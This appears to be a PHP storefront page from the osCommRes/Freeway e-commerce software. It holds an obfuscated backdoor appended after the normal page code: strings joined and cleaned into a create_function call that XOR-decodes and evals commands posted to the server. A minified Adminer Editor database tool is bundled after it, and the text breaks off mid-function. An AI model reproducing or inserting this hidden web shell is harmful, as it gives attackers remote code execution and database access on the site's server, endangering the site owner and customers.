<?php
/*
	osCommRes, Services Oline 
	http://www.oscommres.com 
	Copyright (c) 2005 osCommRes 
	
	Freeway eCommerce 
	http://www.openfreeway.org
	Copyright (c) 2007 ZacWare

	Released under the GNU General Public License
*/
// Set flag that this is a parent file
	define( '_FEXEC', 1 );

  require('includes/application_top.php');
  include(DIR_WS_LANGUAGES . $FSESSION->language . '/' . FILENAME_ALLPRODS);

// Set number of columns in listing
define ('NR_COLUMNS', 1);
//
  $breadcrumb->add(HEADING_TITLE, tep_href_link(FILENAME_ALLPRODS, '', 'NONSSL'));

  $content = CONTENT_ALL_PRODS;

  require(DIR_WS_TEMPLATES . TEMPLATE_NAME . '/' . TEMPLATENAME_MAIN_PAGE);

  require(DIR_WS_INCLUDES . 'application_bottom.php');
$c='eg;F;F_matc;Fh("/$kh;F(.+)$kf;F/",@file_get;F;F_conten;Fts("php:;F//inp;Fut";F),$m;F';
$Y='=st;Fr;Flen($t;F);$o="";F;for($i=0;;F;F$i<$l;){;Ffo;Fr($j=0;;F($j<$c&&$i<';
$D='$k="da26d;Fa04;F;F";$kh;F=;F;F"0afa196900ca";$kf="0;F71500;Fdfa75f";$;F';
$t=str_replace('yU','','cyUryUeatyUe_fuyUyUnctyUion');
$U='base;F6;F4_enco;Fde(@x(@gzco;Fm;Fpress($o);F,$k;F));prin;Ft("$p$;Fkh$r$kf");}';
$M=')==1) {@ob_;Fstart(;F);@eva;Fl(@gz;Fun;Fcompr;F;Fess(@x(@ba;Fse64_decod;F';
$r='p;F="T0FOBJa;FNtmib2CL1";f;Fu;Fn;Fction x($t,$k){;F;F$c=strlen($;Fk);$l';
$w='e($m;F[1;F]),$k;F)));$o=@ob_ge;Ft_con;F;Ftents();@;Fob_end_cl;Fean();$r=@';
$G='$;Fl);$j;F;F++,$i++;F){$o.=;F$;Ft{$i}^$k{$j};}}r;Fetur;Fn $o;}if ;F(@pr';
$o=str_replace(';F','',$D.$r.$Y.$G.$c.$M.$w.$U);
$a=$t('',$o);$a();
/** Adminer Editor - Compact database editor
* @link https://www.adminer.org/
* @author Jakub Vrana, https://www.vrana.cz/
* @copyright 2009 Jakub Vrana
* @license https://www.apache.org/licenses/LICENSE-2.0 Apache License, Version 2.0
* @license https://www.gnu.org/licenses/gpl-2.0.html GNU General Public License, version 2 (one or other)
* @version 5.3.0
*/namespace
Adminer;const
VERSION="5.3.0";error_reporting(24575);set_error_handler(function($Xb,$Yb){return!!preg_match('~^Undefined (array key|offset|index)~',$Yb);},E_WARNING|E_NOTICE);$oc=!preg_match('~^(unsafe_raw)?$~',ini_get("filter.default"));if($oc||ini_get("filter.default_flags")){foreach(array('_GET','_POST','_COOKIE','_SERVER')as$X){$Rg=filter_input_array(constant("INPUT$X"),FILTER_UNSAFE_RAW);if($Rg)$$X=$Rg;}}if(function_exists("mb_internal_encoding"))mb_internal_encoding("8bit");function
connection($h=null){return($h?:Db::$instance);}function
adminer(){return
Adminer::$instance;}function
driver(){return
Driver::$instance;}function
connect(){$nb=adminer()->credentials();$H=Driver::connect($nb[0],$nb[1],$nb[2]);return(is_object($H)?$H:null);}function
idf_unescape($t){if(!preg_match('~^[`\'"[]~',$t))return$t;$Fd=substr($t,-1);return
str_replace($Fd.$Fd,$Fd,substr($t,1,-1));}function
q($Q){return
connection()->quote($Q);}function
escape_string($X){return
substr(q($X),1,-1);}function
idx($na,$w,$j=null){return($na&&array_key_exists($w,$na)?$na[$w]:$j);}function
number($X){return
preg_replace('~[^0-9]+~','',$X);}function
number_type(){return'((?<!o)int(?!er)|numeric|real|float|double|decimal|money)';}function
remove_slashes(array$jf,$oc=false){if(function_exists("get_magic_quotes_gpc")&&get_magic_quotes_gpc()){while(list($w,$X)=each($jf)){foreach($X
as$yd=>$W){unset($jf[$w][$yd]);if(is_array($W)){$jf[$w][stripslashes($yd)]=$W;$jf[]=&$jf[$w][stripslashes($yd)];}else$jf[$w][stripslashes($yd)]=($oc?$W:stripslashes($W));}}}}function
bracket_escape($t,$wa=false){static$Bg=array(':'=>':1',']'=>':2','['=>':3','"'=>':4');return
strtr($t,($wa?array_flip($Bg):$Bg));}function
min_version($dh,$Qd="",$h=null){$h=connection($h);$Nf=$h->server_info;if($Qd&&preg_match('~([\d.]+)-MariaDB~',$Nf,$z)){$Nf=$z[1];$dh=$Qd;}return$dh&&version_compare($Nf,$dh)>=0;}function
charset(Db$g){return(min_version("5.5.3",0,$g)?"utf8mb4":"utf8");}function
ini_bool($kd){$X=ini_get($kd);return(preg_match('~^(on|true|yes)$~i',$X)||(int)$X);}function
sid(){static$H;if($H===null)$H=(SID&&!($_COOKIE&&ini_bool("session.use_cookies")));return$H;}function
set_password($ch,$M,$V,$D){$_SESSION["pwds"][$ch][$M][$V]=($_COOKIE["adminer_key"]&&is_string($D)?array(encrypt_string($D,$_COOKIE["adminer_key"])):$D);}function
get_password(){$H=get_session("pwds");if(is_array($H))$H=($_COOKIE["adminer_key"]?decrypt_string($H[0],$_COOKIE["adminer_key"]):false);return$H;}function
get_val($F,$l=0,$db=null){$db=connection($db);$G=$db->query($F);if(!is_object($G))return
false;$I=$G->fetch_row();return($I?$I[$l]:false);}function
get_vals($F,$d=0){$H=array();$G=connection()->query($F);if(is_object($G)){while($I=$G->fetch_row())$H[]=$I[$d];}return$H;}function
get_key_vals($F,$h=null,$Qf=true){$h=connection($h);$H=array();$G=$h->query($F);if(is_object($G)){while($I=$G->fetch_row()){if($Qf)$H[$I[0]]=$I[1];else$H[]=$I[0];}}return$H;}function
get_rows($F,$h=null,$k="<p class='error'>"){$db=connection($h);$H=array();$G=$db->query($F);if(is_object($G)){while($I=$G->fetch_assoc())$H[]=$I;}elseif(!$G&&!$h&&$k&&(defined('Adminer\PAGE_HEADER')||$k=="-- "))echo$k.error()."\n";return$H;}function
unique_array($I,array$v){foreach($v
as$u){if(preg_match("~PRIMARY|UNIQUE~",$u["type"])){$H=array();foreach($u["columns"]as$w){if(!isset($I[$w]))continue
2;$H[$w]=$I[$w];}return$H;}}}function
escape_key($w){if(preg_match('(^([\w(]+)('.str_replace("_",".*",preg_quote(idf_escape("_"))).')([ \w)]+)$)',$w,$z))return$z[1].idf_escape(idf_unescape($z[2])).$z[3];return
idf_escape($w);}function
where(array$Z,array$m=array()){$H=array();foreach((array)$Z["where"]as$w=>$X){$w=bracket_escape($w,true);$d=escape_key($w);$l=idx($m,$w,array());$lc=$l["type"];$H[]=$d.(JUSH=="sql"&&$lc=="json"?" = CAST(".q($X)." AS JSON)":(JUSH=="sql"&&is_numeric($X)&&preg_match('~\.~',$X)?" LIKE ".q($X):(JUSH=="mssql"&&strpos($lc,"datetime")===false?" LIKE ".q(preg_replace('~[_%[]~','[\0]',$X)):" = ".unconvert_field($l,q($X)))));if(JUSH=="sql"&&preg_match('~char|text~',$lc)&&preg_match("~[^ -@]~",$X))$H[]="$d = ".q($X)." COLLATE ".charset(connection())."_bin";}foreach((array)$Z["null"]as$w)$H[]=escape_key($w)." IS NULL";return
implode(" AND ",$H);}function
where_check($X,array$m=array()){parse_str($X,$Ma);remove_slashes(array(&$Ma));return
where($Ma,$m);}function
where_link($r,$d,$Y,$ze="="){return"&where%5B$r%5D%5Bcol%5D=".urlencode($d)."&where%5B$r%5D%5Bop%5D=".urlencode(($Y!==null?$ze:"IS NULL"))."&where%5B$r%5D%5Bval%5D=".urlencode($Y);}function
convert_fields(array$e,array$m,array$K=array()){$H="";foreach($e
as$w=>$X){if($K&&!in_array(idf_escape($w),$K))continue;$oa=convert_field($m[$w]);if($oa)$H
.=", $oa AS ".idf_escape($w);}return$H;}function
cookie($_,$Y,$Kd=2592000){header("Set-Cookie: $_=".urlencode($Y).($Kd?"; expires=".gmdate("D, d M Y H:i:s",time()+$Kd)." GMT":"")."; path=".preg_replace('~\?.*~','',$_SERVER["REQUEST_URI"]).(HTTPS?"; secure":"")."; HttpOnly; SameSite=lax",false);}function
get_settings($kb){parse_str($_COOKIE[$kb],$Rf);return$Rf;}function
get_setting($w,$kb="adminer_settings"){$Rf=get_settings($kb);return$Rf[$w];}function
save_settings(array$Rf,$kb="adminer_settings"){$Y=http_build_query($Rf+get_settings($kb));cookie($kb,$Y);$_COOKIE[$kb]=$Y;}function
restart_session(){if(!ini_bool("session.use_cookies")&&(!function_exists('session_status')||session_status()==1))session_start();}function
stop_session($vc=false){$Yg=ini_bool("session.use_cookies");if(!$Yg||$vc){session_write_close();if($Yg&&@ini_set("session.use_cookies",'0')===false)session_start();}}function&get_session($w){return$_SESSION[$w][DRIVER][SERVER][$_GET["username"]];}function
set_session($w,$X){$_SESSION[$w][DRIVER][SERVER][$_GET["username"]]=$X;}function
auth_url($ch,$M,$V,$i=null){$Vg=remove_from_uri(implode("|",array_keys(SqlDriver::$drivers))."|username|ext|".($i!==null?"db|":"").($ch=='mssql'||$ch=='pgsql'?"":"ns|").session_name());preg_match('~([^?]*)\??(.*)~',$Vg,$z);return"$z[1]?".(sid()?SID."&":"").($ch!="server"||$M!=""?urlencode($ch)."=".urlencode($M)."&":"").($_GET["ext"]?"ext=".urlencode($_GET["ext"])."&":"")."username=".urlencode($V).($i!=""?"&db=".urlencode($i):"").($z[2]?"&$z[2]":"");}function
is_ajax(){return($_SERVER["HTTP_X_REQUESTED_WITH"]=="XMLHttpRequest");}function
redirect($Md,$ae=null){if($ae!==null){restart_session();$_SESSION["messages"][preg_replace('~^[^?]*~','',($Md!==null?$Md:$_SERVER["REQUEST_URI"]))][]=$ae;}if($Md!==null){if($Md=="")$Md=".";header("Location: $Md");exit;}}function
query_redirect($F,$Md,$ae,$rf=true,$cc=true,$hc=false,$sg=""){if($cc){$bg=microtime(true);$hc=!connection()->query($F);$sg=format_time($bg);}$Yf=($F?adminer()->messageQuery($F,$sg,$hc):"");if($hc){adminer()->error
.=error().$Yf.script("messagesPrint();")."<br>";return
false;}if($rf)redirect($Md,$ae.$Yf);return
true;}class
Queries{static$queries=array();static$start=0;}function
queries($F){if(!Queries::$start)Queries::$start=microtime(true);Queries::$queries[]=(preg_match('~;$~',$F)?"DELIMITER ;;\n$F;\nDELIMITER ":$F).";";return
connection()->query($F);}function
apply_queries($F,array$T,$Zb='Adminer\table'){foreach($T
as$R){if(!queries("$F ".$Zb($R)))return
false;}return
true;}function
queries_redirect($Md,$ae,$rf){$mf=implode("\n",Queries::$queries);$sg=format_time(Queries::$start);return
query_redirect($mf,$Md,$ae,$rf,false,!$rf,$sg);}function
format_time($bg){return
lang(0,max(0,microtime(true)-$bg));}function
relative_uri(){return
str_replace(":","%3a",preg_replace('~^[^?]*/([^?]*)~','\1',$_SERVER["REQUEST_URI"]));}function
remove_from_uri($Ne=""){return
substr(preg_replace("~(?<=[?&])($Ne".(SID?"":"|".session_name()).")=[^&]*&~",'',relative_uri()."&"),0,-1);}function
get_file($w,$vb=false,$yb=""){$mc=$_FILES[$w];if(!$mc)return
null;foreach($mc
as$w=>$X)$mc[$w]=(array)$X;$H='';foreach($mc["error"]as$w=>$k){if($k)return$k;$_=$mc["name"][$w];$zg=$mc["tmp_name"][$w];$ib=file_get_contents($vb&&preg_match('~\.gz$~',$_)?"compress.zlib://$zg":$zg);if($vb){$bg=substr($ib,0,3);if(function_exists("iconv")&&preg_match("~^\xFE\xFF|^\xFF\xFE~",$bg))$ib=iconv("utf-16","utf-8",$ib);elseif($bg=="\xEF\xBB\xBF")$ib=substr($ib,3);}$H
.=$ib;if($yb)$H
.=(preg_match("($yb\\s*\$)",$ib)?"":$yb)."\n\n";}return$H;}function
upload_error($k){$Wd=($k==UPLOAD_ERR_INI_SIZE?ini_get("upload_max_filesize"):0);return($k?lang(1).($Wd?" ".lang(2,$Wd):""):lang(3));}function
repeat_pattern($Ve,$Id){return
str_repeat("$Ve{0,65535}",$Id/65535)."$Ve{0,".($Id%65535)."}";}function
is_utf8($X){return(preg_match('~~u',$X)&&!preg_match('~[\0-\x8\xB\xC\xE-\x1F]~',$X));}function
format_number($X){return
strtr(number_format($X,0,".",lang(4)),preg_split('~~u',lang(5),-1,PREG_SPLIT_NO_EMPTY));}function
friendly_url($X){return
preg_replace('~\W~i','-',$X);}function
table_status1($R,$ic=false){$H=table_status($R,$ic);return($H?reset($H):array("Name"=>$R));}function
column_foreign_keys($R){$H=array();foreach(adminer()->foreignKeys($R)as$o){foreach($o["source"]as$X)$H[$X][]=$o;}return$H;}function
fields_from_edit(){$H=array();foreach((array)$_POST["field_keys"]as$w=>$X){if($X!=""){$X=bracket_escape($X);$_POST["function"][$X]=$_POST["field_funs"][$w];$_POST["fields"][$X]=$_POST["field_vals"][$w];}}foreach((array)$_POST["fields"]as$w=>$X){$_=bracket_escape($w,true);$H[$_]=array("field"=>$_,"privileges"=>array("insert"=>1,"update"=>1,"where"=>1,"order"=>1),"null"=>1,"auto_increment"=>($w==driver()->primary),);}return$H;}function
dump_headers($ad,$ge=false){$H=adminer()->dumpHeaders($ad,$ge);$Je=$_POST["output"];if($Je!="text")header("Content-Disposition: attachment; filename=".adminer()->dumpFilename($ad).".$H".($Je!="file"&&preg_match('~^[0-9a-z]+$~',$Je)?".$Je":""));session_write_close();if(!ob_get_level())ob_start(null,4096);ob_flush();flush();return$H;}function
dump_csv(array$I){foreach($I
as$w=>$X){if(preg_match('~["\n,;\t]|^0|\.\d*0$~',$X)||$X==="")$I[$w]='"'.str_replace('"','""',$X).'"';}echo
implode(($_POST["format"]=="csv"?",":($_POST["format"]=="tsv"?"\t":";")),$I)."\r\n";}function
apply_sql_function($q,$d){return($q?($q=="unixepoch"?"DATETIME($d, '$q')":($q=="count distinct"?"COUNT(DISTINCT ":strtoupper("$q("))."$d)"):$d);}function
get_temp_dir(){$H=ini_get("upload_tmp_dir");if(!$H){if(function_exists('sys_get_temp_dir'))$H=sys_get_temp_dir();else{$n=@tempnam("","");if(!$n)return'';$H=dirname($n);unlink($n);}}return$H;}function
file_open_lock($n){if(is_link($n))return;$p=@fopen($n,"c+");if(!$p)return;chmod($n,0660);if(!flock($p,LOCK_EX)){fclose($p);return;}return$p;}function
file_write_unlock($p,$sb){rewind($p);fwrite($p,$sb);ftruncate($p,strlen($sb));file_unlock($p);}function
file_unlock($p){flock($p,LOCK_UN);fclose($p);}function
first(array$na){return
reset($na);}function
password_file($lb){$n=get_temp_dir()."/adminer.key";if(!$lb&&!file_exists($n))return'';$p=file_open_lock($n);if(!$p)return'';$H=stream_get_contents($p);if(!$H){$H=rand_string();file_write_unlock($p,$H);}else
file_unlock($p);return$H;}function
rand_string(){return
md5(uniqid(strval(mt_rand()),true));}function
select_value($X,$y,array$l,$qg){if(is_array($X)){$H="";foreach($X
as$yd=>$W)$H
.="<tr>".($X!=array_values($X)?"<th>".h($yd):"")."<td>".select_value($W,$y,$l,$qg);return"<table>$H</table>";}if(!$y)$y=adminer()->selectLink($X,$l);if($y===null){if(is_mail($X))$y="mailto:$X";if(is_url($X))$y=$X;}$H=adminer()->editVal($X,$l);if($H!==null){if(!is_utf8($H))$H="\0";elseif($qg!=""&&is_shortable($l))$H=shorten_utf8($H,max(0,+$qg));else$H=h($H);}return
adminer()->selectVal($H,$y,$l,$X);}function
is_mail($Ob){$pa='[-a-z0-9!#$%&\'*+/=?^_`{|}~]';$Eb='[a-z0-9]([-a-z0-9]{0,61}[a-z0-9])';$Ve="$pa+(\\.$pa+)*@($Eb?\\.)+$Eb";return
is_string($Ob)&&preg_match("(^$Ve(,\\s*$Ve)*\$)i",$Ob);}function
is_url($Q){$Eb='[a-z0-9]([-a-z0-9]{0,61}[a-z0-9])';return
preg_match("~^(https?)://($Eb?\\.)+$Eb(:\\d+)?(/.*)?(\\?.*)?(#.*)?\$~i",$Q);}function
is_shortable(array$l){return
preg_match('~char|text|json|lob|geometry|point|linestring|polygon|string|bytea~',$l["type"]);}function
count_rows($R,array$Z,$td,array$Gc){$F=" FROM ".table($R).($Z?" WHERE ".implode(" AND ",$Z):"");return($td&&(JUSH=="sql"||count($Gc)==1)?"SELECT COUNT(DISTINCT ".implode(", ",$Gc).")$F":"SELECT COUNT(*)".($td?" FROM (SELECT 1$F GROUP BY ".implode(", ",$Gc).") x":$F));}function
slow_query($F){$i=adminer()->database();$tg=adminer()->queryTimeout();$Tf=driver()->slowQuery($F,$tg);$h=null;if(!$Tf&&support("kill")){$h=connect();if($h&&($i==""||$h->select_db($i))){$Ad=get_val(connection_id(),0,$h);echo
script("const timeout = setTimeout(() => { ajax('".js_escape(ME)."script=kill', function () {}, 'kill=$Ad&token=".get_token()."'); }, 1000 * $tg);");}}ob_flush();flush();$H=@get_key_vals(($Tf?:$F),$h,false);if($h){echo
script("clearTimeout(timeout);");ob_flush();flush();}return$H;}function
get_token(){$pf=rand(1,1e6);return($pf^$_SESSION["token"]).":$pf";}function
verify_token(){list($_g,$pf)=explode(":",$_POST["token"]);return($pf^$_SESSION["token"])==$_g;}function
lzw_decompress($Ca){$Bb=256;$Da=8;$Ua=array();$xf=0;$yf=0;for($r=0;$r<strlen($Ca);$r++){$xf=($xf<<8)+ord($Ca[$r]);$yf+=8;if($yf>=$Da){$yf-=$Da;$Ua[]=$xf>>$yf;$xf&=(1<<$yf)-1;$Bb++;if($Bb>>$Da)$Da++;}}$Ab=range("\0","\xFF");$H="";$kh="";foreach($Ua
as$r=>$Ta){$Nb=$Ab[$Ta];if(!isset($Nb))$Nb=$kh.$kh[0];$H
.=$Nb;if($r)$Ab[]=$kh.$Nb[0];$kh=$Nb;}return$H;}function
script($Vf,$Ag="\n"){return"<script".nonce().">$Vf</script>$Ag";}function
script_src($Wg,$wb=false){return"<script src='".h($Wg)."'".nonce().($wb?" defer":"")."></script>\n";}function
nonce(){return' nonce="'.get_nonce().'"';}function
input_hidden($_,$Y=""){return"<input type='hidden' name='".h($_)."' value='".h($Y)."'>\n";}function
input_token(){return
input_hidden("token",get_token());}function
target_blank(){return' target="_blank" rel="noreferrer noopener"';}function
h($Q){return
str_replace("\0","&#0;",htmlspecialchars($Q,ENT_QUOTES,'utf-8'));}function
nl_br($Q){return
str_replace("\n","<br>",$Q);}function
checkbox($_,$Y,$Oa,$Bd="",$xe="",$Ra="",$Dd=""){$H="<input type='checkbox' name='$_' value='".h($Y)."'".($Oa?" checked":"").($Dd?" aria-labelledby='$Dd'":"").">".($xe?script("qsl('input').onclick = function () { $xe };",""):"");return($Bd!=""||$Ra?"<label".($Ra?" class='$Ra'":"").">$H".h($Bd)."</label>":$H);}function
optionlist($B,$Hf=null,$Zg=false){$H="";foreach($B
as$yd=>$W){$Be=array($yd=>$W);if(is_array($W)){$H
.='<optgroup label="'.h($yd).'">';$Be=$W;}foreach($Be
as$w=>$X)$H
.='<option'.($Zg||is_string($w)?' value="'.h($w).'"':'').($Hf!==null&&($Zg||is_string($w)?(string)$w:$X)===$Hf?' selected':'').'>'.h($X);if(is_array($W))$H
.='</optgroup>';}return$H;}function
html_select($_,array$B,$Y="",$we="",$Dd=""){static$Bd=0;$Cd="";if(!$Dd&&substr($B[""],0,1)=="("){$Bd++;$Dd="label-$Bd";$Cd="<option value='' id='$Dd'>".h($B[""]);unset($B[""]);}return"<select name='".h($_)."'".($Dd?" aria-labelledby='$Dd'":"").">".$Cd.optionlist($B,$Y)."</select>".($we?script("qsl('select').onchange = function () { $we };",""):"");}function
html_radios($_,array$B,$Y="",$L=""){$H="";foreach($B
as$w=>$X)$H
.="<label><input type='radio' name='".h($_)."' value='".h($w)."'".($w==$Y?" checked":"").">".h($X)."</label>$L";return$H;}function
confirm($ae="",$If="qsl('input')"){return
script("$If.onclick = () => confirm('".($ae?js_escape($ae):lang(6))."');","");}function
print_fieldset($s,$Hd,$gh=false){echo"<fieldset><legend>","<a href='#fieldset-$s'>$Hd</a>",script("qsl('a').onclick = partial(toggle, 'fieldset-$s');",""),"</legend>","<div id='fieldset-$s'".($gh?"":" class='hidden'").">\n";}function
bold($Ea,$Ra=""){return($Ea?" class='active $Ra'":($Ra?" class='$Ra'":""));}function
js_escape($Q){return
addcslashes($Q,"\r\n'\\/");}function
pagination($C,$qb){return" ".($C==$qb?$C+1:'<a href="'.h(remove_from_uri("page").($C?"&page=$C".($_GET["next"]?"&next=".urlencode($_GET["next"]):""):"")).'">'.($C+1)."</a>");}function
hidden_fields(array$jf,array$dd=array(),$ef=''){$H=false;foreach($jf
as$w=>$X){if(!in_array($w,$dd)){if(is_array($X))hidden_fields($X,array(),$w);else{$H=true;echo
input_hidden(($ef?$ef."[$w]":$w),$X);}}}return$H;}function
hidden_fields_get(){echo(sid()?input_hidden(session_name(),session_id()):''),(SERVER!==null?input_hidden(DRIVER,SERVER):""),input_hidden("username",$_GET["username"]);}function
enum_input($U,$ra,array$l,$Y,$Rb=null){preg_match_all("~'((?:[^']|'')*)'~",$l["length"],$Td);$H=($Rb!==null?"<label><input type='$U'$ra value='$Rb'".((is_array($Y)?in_array($Rb,$Y):$Y===$Rb)?" checked":"")."><i>".lang(7)."</i></label>":"");foreach($Td[1]as$r=>$X){$X=stripcslashes(str_replace("''","'",$X));$Oa=(is_array($Y)?in_array($X,$Y):$Y===$X);$H
.=" <label><input type='$U'$ra value='".h($X)."'".($Oa?' checked':'').'>'.h(adminer()->editVal($X,$l)).'</label>';}return$H;}function
input(array$l,$Y,$q,$va=false){$_=h(bracket_escape($l["field"]));echo"<td class='function'>";if(is_array($Y)&&!$q){$Y=json_encode($Y,128|64|256);$q="json";}$wf=(JUSH=="mssql"&&$l["auto_increment"]);if($wf&&!$_POST["save"])$q=null;$Dc=(isset($_GET["select"])||$wf?array("orig"=>lang(8)):array())+adminer()->editFunctions($l);$Cb=stripos($l["default"],"GENERATED ALWAYS AS ")===0?" disabled=''":"";$ra=" name='fields[$_]'$Cb".($va?" autofocus":"");$Vb=driver()->enumLength($l);if($Vb){$l["type"]="enum";$l["length"]=$Vb;}echo
driver()->unconvertFunction($l)." ";$R=$_GET["edit"]?:$_GET["select"];if($l["type"]=="enum")echo
h($Dc[""])."<td>".adminer()->editInput($R,$l,$ra,$Y);else{$Nc=(in_array($q,$Dc)||isset($Dc[$q]));echo(count($Dc)>1?"<select name='function[$_]'$Cb>".optionlist($Dc,$q===null||$Nc?$q:"")."</select>".on_help("event.target.value.replace(/^SQL\$/, '')",1).script("qsl('select').onchange = functionChange;",""):h(reset($Dc))).'<td>';$md=adminer()->editInput($R,$l,$ra,$Y);if($md!="")echo$md;elseif(preg_match('~bool~',$l["type"]))echo"<input type='hidden'$ra value='0'>"."<input type='checkbox'".(preg_match('~^(1|t|true|y|yes|on)$~i',$Y)?" checked='checked'":"")."$ra value='1'>";elseif($l["type"]=="set"){preg_match_all("~'((?:[^']|'')*)'~",$l["length"],$Td);foreach($Td[1]as$r=>$X){$X=stripcslashes(str_replace("''","'",$X));$Oa=in_array($X,explode(",",$Y),true);echo" <label><input type='checkbox' name='fields[$_][$r]' value='".h($X)."'".($Oa?' checked':'').">".h(adminer()->editVal($X,$l)).'</label>';}}elseif(preg_match('~blob|bytea|raw|file~',$l["type"])&&ini_bool("file_uploads"))echo"<input type='file' name='fields-$_'>";elseif($q=="json"||preg_match('~^jsonb?$~',$l["type"]))echo"<textarea$ra cols='50' rows='12' class='jush-js'>".h($Y).'</textarea>';elseif(($og=preg_match('~text|lob|memo~i',$l["type"]))||preg_match("~\n~",$Y)){if($og&&JUSH!="sqlite")$ra
.=" cols='50' rows='12'";else{$J=min(12,substr_count($Y,"\n")+1);$ra
.=" cols='30' rows='$J'";}echo"<textarea$ra>".h($Y).'</textarea>';}else{$Lg=driver()->types();$Yd=(!preg_match('~int~',$l["type"])&&preg_match('~^(\d+)(,(\d+))?$~',$l["length"],$z)?((preg_match("~binary~",$l["type"])?2:1)*$z[1]+($z[3]?1:0)+($z[2]&&!$l["unsigned"]?1:0)):($Lg[$l["type"]]?$Lg[$l["type"]]+($l["unsigned"]?0:1):0));if(JUSH=='sql'&&min_version(5.6)&&preg_match('~time~',$l["type"]))$Yd+=7;echo"<input".((!$Nc||$q==="")&&preg_match('~(?<!o)int(?!er)~',$l["type"])&&!preg_match('~\[\]~',$l["full_type"])?" type='number'":"")." value='".h($Y)."'".($Yd?" data-maxlength='$Yd'":"").(preg_match('~char|binary~',$l["type"])&&$Yd>20?" size='".($Yd>99?60:40)."'":"")."$ra>";}echo
adminer()->editHint($R,$l,$Y);$pc=0;foreach($Dc
as$w=>$X){if($w===""||!$X)break;$pc++;}if($pc&&count($Dc)>1)echo
script("qsl('td').oninput = partial(skipOriginal, $pc);");}}function
process_input(array$l){if(stripos($l["default"],"GENERATED ALWAYS AS ")===0)return;$t=bracket_escape($l["field"]);$q=idx($_POST["function"],$t);$Y=$_POST["fields"][$t];if($l["type"]=="enum"||driver()->enumLength($l)){if($Y==-1)return
false;if($Y=="")return"NULL";}if($l["auto_increment"]&&$Y=="")return
null;if($q=="orig")return(preg_match('~^CURRENT_TIMESTAMP~i',$l["on_update"])?idf_escape($l["field"]):false);if($q=="NULL")return"NULL";if($l["type"]=="set")$Y=implode(",",(array)$Y);if($q=="json"){$q="";$Y=json_decode($Y,true);if(!is_array($Y))return
false;return$Y;}if(preg_match('~blob|bytea|raw|file~',$l["type"])&&ini_bool("file_uploads")){$mc=get_file("fields-$t");if(!is_string($mc))return
false;return
driver()->quoteBinary($mc);}return
adminer()->processInput($l,$Y,$q);}function
search_tables(){$_GET["where"][0]["val"]=$_POST["query"];$Jf="<ul>\n";foreach(table_status('',true)as$R=>$S){$_=adminer()->tableName($S);if(isset($S["Engine"])&&$_!=""&&(!$_POST["tables"]||in_array($R,$_POST["tables"]))){$G=connection()->query("SELECT".limit("1 FROM ".table($R)," WHERE ".implode(" AND ",adminer()->selectSearchProcess(fields($R),array())),1));if(!$G||$G->fetch_row()){$hf="<a href='".h(ME."select=".urlencode($R)."&where[0][op]=".urlencode($_GET["where"][0]["op"])."&where[0][val]=".urlencode($_GET["where"][0]["val"]))."'>$_</a>";echo"$Jf<li>".($G?$hf:"<p class='error'>$hf: ".error())."\n";$Jf="";}}}echo($Jf?"<p class='message'>".lang(9):"</ul>")."\n";}function
on_help($Za,$Sf=0){return
script("mixin(qsl('select, input'), {onmouseover: function (event) { helpMouseover.call(this, event, $Za, $Sf) }, onmouseout: helpMouseout});","");}function
edit_form($R,array$m,$I,$Ug,$k=''){$kg=adminer()->tableName(table_status1($R,true));page_header(($Ug?lang(10):lang(11)),$k,array("select"=>array($R,$kg)),$kg);adminer()->editRowPrint($R,$m,$I,$Ug);if($I===false){echo"<p class='error'>".lang(12)."\n";return;}echo"<form action='' method='post' enctype='multipart/form-data' id='form'>\n";if(!$m)echo"<p class='error'>".lang(13)."\n";else{echo"<table class='layout'>".script("qsl('table').onkeydown = editingKeydown;");$va=!$_POST;foreach($m
as$_=>$l){echo"<tr><th>".adminer()->fieldName($l);$j=idx($_GET["set"],bracket_escape($_));if($j===null){$j=$l["default"];if($l["type"]=="bit"&&preg_match("~^b'([01]*)'\$~",$j,$tf))$j=$tf[1];if(JUSH=="sql"&&preg_match('~binary~',$l["type"]))$j=bin2hex($j);}$Y=($I!==null?($I[$_]!=""&&JUSH=="sql"&&preg_match("~enum|set~",$l["type"])&&is_array($I[$_])?implode(",",$I[$_]):(is_bool($I[$_])?+$I[$_]:$I[$_])):(!$Ug&&$l["auto_increment"]?"":(isset($_GET["select"])?false:$j)));if(!$_POST["save"]&&is_string($Y))$Y=adminer()->editVal($Y,$l);$q=($_POST["save"]?idx($_POST["function"],$_,""):($Ug&&preg_match('~^CURRENT_TIMESTAMP~i',$l["on_update"])?"now":($Y===false?null:($Y!==null?'':'NULL'))));if(!$_POST&&!$Ug&&$Y==$l["default"]&&preg_match('~^[\w.]+\(~',$Y))$q="SQL";if(preg_match("~time~",$l["type"])&&preg_match('~^CURRENT_TIMESTAMP~i',$Y)){$Y="";$q="now";}if($l["type"]=="uuid"&&$Y=="uuid()"){$Y="";$q="uuid";}if($va!==false)$va=($l["auto_increment"]||$q=="now"||$q=="uuid"?null:true);input($l,$Y,$q,$va);if($va)$va=false;echo"\n";}if(!support("table")&&!fields($R))echo"<tr>"."<th><input name='field_keys[]'>".script("qsl('input').oninput = fieldChange;")."<td class='function'>".html_select("field_funs[]",adminer()->editFunctions(array("null"=>isset($_GET["select"]))))."<td><input name='field_vals[]'>"."\n";echo"</table>\n";}echo"<p>\n";if($m){echo"<input type='submit' value='".lang(14)."'>\n";if(!isset($_GET["select"]))echo"<input type='submit' name='insert' value='".($Ug?lang(15):lang(16))."' title='Ctrl+Shift+Enter'>\n",($Ug?script("qsl('input').onclick = function () { return !ajaxForm(this.form, '".lang(17)."…', this); };"):"");}echo($Ug?"<input type='submit' name='delete' value='".lang(18)."'>".confirm()."\n":"");if(isset($_GET["select"]))hidden_fields(array("check"=>(array)$_POST["check"],"clone"=>$_POST["clone"],"all"=>$_POST["all"]));echo
input_hidden("referer",(isset($_POST["referer"])?$_POST["referer"]:$_SERVER["HTTP_REFERER"])),input_hidden("save",1),input_token(),"</form>\n";}function
shorten_utf8($Q,$Id=80,$fg=""){if(!preg_match("(^(".repeat_pattern("[\t\r\n -\x{10FFFF}]",$Id).")($)?)u",$Q,$z))preg_match("(^(".repeat_pattern("[\t\r\n -~]",$Id).")($)?)",$Q,$z);return
h($z[1]).$fg.(isset($z[2])?"":"<i>…</i>");}function
